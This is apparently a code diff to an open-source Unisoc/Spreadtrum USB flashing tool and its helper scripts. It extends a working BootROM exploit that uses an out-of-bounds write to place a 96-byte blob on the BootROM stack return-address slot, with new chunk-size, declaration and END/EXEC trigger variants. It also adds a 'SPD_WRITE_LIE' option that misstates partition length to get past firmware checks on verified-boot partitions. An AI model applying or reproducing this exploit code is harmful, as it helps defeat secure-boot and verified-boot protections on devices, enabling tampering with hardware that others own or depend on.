@@ -1,0 +1,225 @@
+diff --git a/scripts/flash_gen.py b/scripts/flash_gen.py
+index f84d5c7..d45a900 100755
+--- a/scripts/flash_gen.py
++++ b/scripts/flash_gen.py
+@@ -20,7 +20,7 @@ def parse_gpt(path):
+     for p in ET.parse(path).getroot():
+         try: s = int(p.get('size'))
+         except ValueError: continue
+-        if 0 < s <= 4096: g.add(p.get('id'))
++        if 0 < s <= 102400: g.add(p.get('id'))
+     return g
+ 
+ def main():
+@@ -36,7 +36,7 @@ def main():
+             continue
+         if part not in gpt or RULE_ERASE(part):
+             continue
+-        fn = os.path.join(a.imgdir, f)
++        fn = os.path.join(a.imgdir, f + ".bin")
+         m = os.path.getmtime(fn)
+         if part not in best or m > best[part][1]:
+             if part in best:
+diff --git a/scripts/runner.sh b/scripts/runner.sh
+index 0b6fa45..985ec28 100755
+--- a/scripts/runner.sh
++++ b/scripts/runner.sh
+@@ -20,6 +20,13 @@ import usb.core
+ print(1 if usb.core.find(idVendor=0x1782,idProduct=0x4d00) else 0)" 2>/dev/null)
+   if [ "$found" = "1" ] && [ "$prev" = "0" ]; then
+     echo "$(date +%H:%M:%S) >>> fresh BootROM transition, firing"
++    if [ "${EXEC_ADDR:-}" = "none" ]; then
++      # plain signed-FDL load, no CVE bypass
++      ./spd_dump --wait 3 verbose 1 \
++        fdl ${FDL1:-fdl1-dl.bin} 0x65000800 fdl ${FDL2:-fdl2-dl.bin} 0xbefffe00 \
++        disable_transcode partition_list gpt.xml
++      rc=$?
++    else
+     ./spd_dump --wait 3 exec_addr2 ${EXEC_ADDR:-0x65017f08} verbose 1 \
+       fdl fdl1-dl.bin 0x65000800 fdl fdl2-dl.bin 0xbefffe00 \
+       disable_transcode partition_list gpt.xml
+@@ -31,6 +38,7 @@ print(1 if usb.core.find(idVendor=0x1782,idProduct=0x4d00) else 0)" 2>/dev/null)
+         disable_transcode partition_list gpt.xml
+       rc=$?
+     fi
++    fi
+     if [ $rc -eq 0 ]; then
+       echo "$(date +%H:%M:%S) PROBE OK"
+       if [ -n "${FOLLOW:-}" ] && [ -f "$FOLLOW" ]; then
+diff --git a/src/spd_dump.c b/src/spd_dump.c
+index de54ad4..da53e14 100644
+--- a/src/spd_dump.c
++++ b/src/spd_dump.c
+@@ -1016,9 +1016,15 @@ static void load_partition(spdio_t *io, const char *name,
+ 	DBG_LOG("file size : 0x%llx\n", (long long)len);
+ 
+ 	mode64 = len >> 32;
+-	check_confirm("write partition");
+-	select_partition(io, name, len, mode64, BSL_CMD_START_DATA);
+-	send_and_check(io);
++	/* SPD_WRITE_LIE: declare len+0x1000 so the image's last block is never
++	 * the transfer-completing block (workaround for FDL2 builds that reject
++	 * the completing block of AVB-chain partitions). */
++	{
++		uint64_t lie = getenv("SPD_WRITE_LIE") ? 0x1000 : 0;
++		check_confirm("write partition");
++		select_partition(io, name, len + lie, mode64, BSL_CMD_START_DATA);
++		send_and_check(io);
++	}
+ 
+ 	for (offset = 0; (n64 = len - offset); offset += n) {
+ 		n = n64 > step ? step : n64;
+@@ -1037,7 +1043,16 @@ static void load_partition(spdio_t *io, const char *name,
+ 			name, (long long)len, (long long)offset);
+ 	fclose(fi);
+ 	encode_msg(io, BSL_CMD_END_DATA, NULL, 0);
+-	send_and_check(io);
++	if (getenv("SPD_WRITE_LIE")) {
++		/* tolerant: a size-mismatch complaint here must not kill the
++		 * batch; the blocks were already streamed to flash */
++		send_msg(io);
++		recv_msg(io);
++		if ((ret = recv_type(io)) != BSL_REP_ACK)
++			DBG_LOG("END_DATA tolerant: 0x%04x\n", ret);
++	} else {
++		send_and_check(io);
++	}
+ }
+ 
+ static int64_t find_partition_size(spdio_t *io, const char *name) {
+@@ -1340,29 +1355,68 @@ int main(int argc, char **argv) {
+ 					// MIDST_DATA padding up to exec_blob_addr, then the
+ 					// 96-byte blob lands exactly on the BootROM stack
+ 					// return-address slot. No EXEC is ever sent.
++					//
++					// MIDST chunk size selects the BROM copy path (and
++					// thus the live stack depth while the blob lands).
++					// The closed tool uses large blocks; 528 (default)
++					// takes a shallower path on newer BROMs. Tune with
++					// SPD_EXEC2_STEP (bytes, <= 0xffff).
+ 					struct stat st;
+ 					size_t fsize = 0, bsize = 0, i2, n2, gapsize;
+ 					uint8_t *pad, *blob;
++					unsigned xstep = 528;
++					const char *ss = getenv("SPD_EXEC2_STEP");
++					if (ss && *ss) {
++						long v = atol(ss);
++						if (v > 0 && v <= 0xffff) xstep = (unsigned)v;
++					}
+ 					if (stat(fn, &st)) ERR_EXIT("stat(%s) failed\n", fn);
+ 					fsize = st.st_size;
+-					send_file(io, fn, addr, 0, 528, 0, 0);
++					fprintf(stderr, "[exec_addr2] step=%u\n", xstep);
++					const char *decl = getenv("SPD_EXEC2_DECLARE");
++					if (decl && !strcmp(decl, "full")) {
++						// Declare the FULL OOB extent in START_DATA
++						// (fdl1 + gap + blob) like the closed tool, so the
++						// BROM sizes its receive path for the whole span.
++						blob = loadfile(exec_blob_fn, &bsize, 0);
++						if (!blob)
++							ERR_EXIT("loadfile(%s) failed\n", exec_blob_fn);
++						gapsize = exec_blob_addr - addr - fsize;
++						size_t total = fsize + gapsize + bsize;
++						uint8_t *whole = calloc(1, total);
++						if (!whole) ERR_EXIT("oom\n");
++						FILE *ff = fopen(fn, "rb");
++						if (!ff || fread(whole, 1, fsize, ff) != fsize)
++							ERR_EXIT("read(%s) failed\n", fn);
++						fclose(ff);
++						memcpy(whole + fsize + gapsize, blob, bsize);
++						fprintf(stderr, "[exec_addr2] START declares full "
++							"%zu bytes (fdl1=%zu gap=%zu blob=%zu)\n",
++							total, fsize, gapsize, bsize);
++						send_buf(io, addr, 0, xstep, whole, total);
++						free(whole); free(blob);
++					} else {
++						send_file(io, fn, addr, 0, xstep, 0, 0);
++					}
+ 					gapsize = exec_blob_addr - addr - fsize;
+-					fprintf(stderr, "[exec_addr2] fdl1=%zu gap=%zu blob@0x%08x\n",
+-						fsize, gapsize, exec_blob_addr);
+-					pad = calloc(1, 528);
+-					if (!pad) ERR_EXIT("oom\n");
+-					for (i2 = 0; i2 < gapsize; i2 += n2) {
+-						n2 = gapsize - i2;
+-						if (n2 > 528) n2 = 528;
+-						encode_msg(io, BSL_CMD_MIDST_DATA, pad, n2);
++					if (!(decl && !strcmp(decl, "full"))) {
++						fprintf(stderr, "[exec_addr2] fdl1=%zu gap=%zu blob@0x%08x\n",
++							fsize, gapsize, exec_blob_addr);
++						pad = calloc(1, xstep);
++						if (!pad) ERR_EXIT("oom\n");
++						for (i2 = 0; i2 < gapsize; i2 += n2) {
++							n2 = gapsize - i2;
++							if (n2 > xstep) n2 = xstep;
++							encode_msg(io, BSL_CMD_MIDST_DATA, pad, n2);
++							send_and_check(io);
++						}
++						free(pad);
++						blob = loadfile(exec_blob_fn, &bsize, 0);
++						if (!blob) ERR_EXIT("loadfile(%s) failed\n", exec_blob_fn);
++						encode_msg(io, BSL_CMD_MIDST_DATA, blob, bsize);
+ 						send_and_check(io);
++						free(blob);
+ 					}
+-					free(pad);
+-					blob = loadfile(exec_blob_fn, &bsize, 0);
+-					if (!blob) ERR_EXIT("loadfile(%s) failed\n", exec_blob_fn);
+-					encode_msg(io, BSL_CMD_MIDST_DATA, blob, bsize);
+-					send_and_check(io);
+-					free(blob);
+ 				} else {
+ 					send_file(io, fn, addr, end_data,
+ 						blk_size ? blk_size : 528, 0, 0);
+@@ -1376,7 +1430,22 @@ int main(int argc, char **argv) {
+ 					send_file(io, exec_blob_fn, exec_blob_addr, 0,
+ 						blk_size ? blk_size : 528, 0, 0);
+ 				} else if (exec_blob_fn && exec_blob_mode == 2) {
+-					// blob already delivered via OOB write; no EXEC
++					// blob already delivered via OOB write.
++					// Variant for BROM builds whose hijacked return only
++					// fires when the transfer is closed: END (and EXEC)
++					// like the closed spd_dump. SPD_EXEC2_END_EXEC=1 ->
++					// END+EXEC, =2 -> END only, unset/0 -> no EXEC.
++					const char *ee = getenv("SPD_EXEC2_END_EXEC");
++					if (ee && *ee && strcmp(ee, "0")) {
++						encode_msg(io, BSL_CMD_END_DATA, NULL, 0);
++						send_and_check(io);
++						fprintf(stderr, "[exec_addr2] END_DATA sent\n");
++						if (strcmp(ee, "2")) {
++							encode_msg(io, BSL_CMD_EXEC_DATA, NULL, 0);
++							send_and_check(io);
++							fprintf(stderr, "[exec_addr2] EXEC_DATA sent\n");
++						}
++					}
+ 				} else if (t117_exec_dist) {
+ 					t117_exec_workaround(io, addr);
+ 				} else {
+@@ -1388,13 +1457,20 @@ int main(int argc, char **argv) {
+ 				io->flags &= ~FLAGS_CRC16;
+ 
+ 				encode_msg(io, BSL_CMD_CHECK_BAUD, NULL, 4);
+-				for (i = 0; i < 30; i++) {
+-					if (io->verbose >= 1)
+-						DBG_LOG("checkbaud %d\n", i + 1);
+-					send_msg(io);
+-					ret = recv_msg(io);
+-					if (ret) break;
+-					usleep(300000);
++				{
++					// FDL1 inits DDR while we poll; short USB timeouts
++					// die on transient NAKs. Be patient (>=10s) here.
++					int old_to = io->timeout;
++					if (old_to < 10000) io->timeout = 10000;
++					for (i = 0; i < 30; i++) {
++						if (io->verbose >= 1)
++							DBG_LOG("checkbaud %d\n", i + 1);
++						send_msg(io);
++						ret = recv_msg(io);
++						if (ret) break;
++						usleep(300000);
++					}
++					io->timeout = old_to;
+ 				}
+ 				if (recv_type(io) != BSL_REP_VER)
+ 					ERR_EXIT("ver expected\n");
